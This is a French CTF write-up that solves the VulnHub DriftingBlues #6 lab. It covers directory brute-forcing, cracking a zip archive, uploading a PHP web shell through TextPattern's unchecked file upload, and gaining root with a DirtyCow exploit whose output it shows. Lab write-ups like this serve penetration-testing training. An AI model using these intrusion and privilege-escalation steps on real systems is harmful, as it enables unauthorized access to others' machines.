# Solution du CTF DriftingBlues #6 de VulnHub

Quick
-----

Petite présentation tout de même avant d’enchaîner en vitesse grand V. [Ce CTF](https://www.vulnhub.com/entry/driftingblues-6,672/) créé par [tasiyanci](https://twitter.com/tasiyanci) est un boot2root récupérable par VulnHub et de difficulté facile.  

La VM fait tourner un site qui nous accueille avec le message suivant :  

```plain
Drifting Blues Tech
please don't hack
enough is enough!!!
```

Amusant vu qu'on est sur le 6ème opus de cette saga de CTF. Oui quelque part on s'acharne :D   

Je lance Wapiti dessus avec tous les modules dispos. Le buster intégré me remonte pas mal de choses intéressantes :  

```plain
[*] Lancement du module buster 
Found webpage http://192.168.56.11/index.html 
Found webpage http://192.168.56.11/robots.txt 
Found webpage http://192.168.56.11/db 
Found webpage http://192.168.56.11/index 
Found webpage http://192.168.56.11/robots 
Found webpage http://192.168.56.11/textpattern/ 
Found webpage http://192.168.56.11/textpattern/LICENSE.txt 
Found webpage http://192.168.56.11/textpattern/index.php 
Found webpage http://192.168.56.11/textpattern/css.php 
Found webpage http://192.168.56.11/textpattern/README.txt 
Found webpage http://192.168.56.11/textpattern/images/ 
Found webpage http://192.168.56.11/textpattern/themes/ 
Found webpage http://192.168.56.11/textpattern/files/ 
Found webpage http://192.168.56.11/textpattern/README 
Found webpage http://192.168.56.11/textpattern/textpattern/ 
Found webpage http://192.168.56.11/textpattern/rpc/ 
Found webpage http://192.168.56.11/textpattern/LICENSE
```

TextPattern est un CMS et le README nous indique qu'il est ici en version 4.8.3. Ça tombe bien il y a sur exploit-db des exploits [comme celui ci](https://www.exploit-db.com/exploits/48943) pour cette version du logiciel.  

L'exploitation nécessite toutefois un compte que l'on a pas. Heureusement on trouve une piste dans le fichier *robots.txt* :  

```plain
User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

Je m'exécute :  

```plain
feroxbuster -u http://192.168.56.11/ -w /fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -n -x php,txt,zip,html
```

Il en ressort une archive spammer.zip protégée par mot de passe. Je génère le hash correspondant avec *zip2john* et *John the Ripper* casse ce dernier instantanément :  

```plain
myspace4         (spammer.zip/creds.txt)
```

Le fichier *creds.txt* obtenu contient des identifiants : *mayer:lionheart*.  

Sans surprise ils permettent de se connecter sur l'appli web. Maintenant parlons de l'exploit pour TextPattern. En le lisant on comprend qu'il ne fait rien de plus qu'utiliser la fonctionnalité d'upload qui ne vérifie pas le type de fichier.  

Pas besoin d'exploit donc, on va sur *Content* puis *Files*. Ensuite on sélectionne le fichier, on upload et voilà un shell bêtement à l'adresse */textpattern/files/shell.php*.  

Une fois un shell plus civilisé obtenu (merci *ReverseSSH*) je fouille sur le système et constate surtout qu'il n'y a pas d'utilisateurs classiques (disposant d'un dossier dans */home*). De plus LinPEAS se montre assez silencieux si ce n'est pour les exploits touchant la distribution.  

C'est de toute évidence le cheminement attendu car si un utilisateur avait été présent nous aurions pu passer outre en utilisant directement un exploit pour le kernel.  

Plus qu'à prendre un des exploits pour [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) :  

```plain
www-data@driftingblues:/tmp$ ./dirty g0tr00t 
/etc/passwd successfully backed up to /tmp/passwd.bak 
Please enter the new password: g0tr00t 
Complete line: 
firefart:fihv2UhZG2gL6:0:0:pwned:/root:/bin/bash 

mmap: 7f91e30e8000 
madvise 0 

ptrace 0 
Done! Check /etc/passwd to see if the new user was created. 
You can log in with the username 'firefart' and the password 'g0tr00t'. 

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd 
Done! Check /etc/passwd to see if the new user was created. 
You can log in with the username 'firefart' and the password 'g0tr00t'. 

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
firefart@driftingblues:/tmp# cd /root/ 
firefart@driftingblues:~# ls 
flag.txt 
firefart@driftingblues:~# cat flag.txt  

░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ 
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ 
░░░░█░░░░░░░░░░░░░░░░░░░░░░█ 
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ 
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ 
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ 
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ 
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ 
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ 
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ 
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ 
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ 
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ 
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ 
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ 
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ 
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ 
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ 
░░█░░▌░█░░█░░█░░░█░░█░░█ 
░░█░░▀▀░░██░░█░░░█░░█░░█ 
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ 

congratulations!

```


*Published January 20 2022 at 22:38*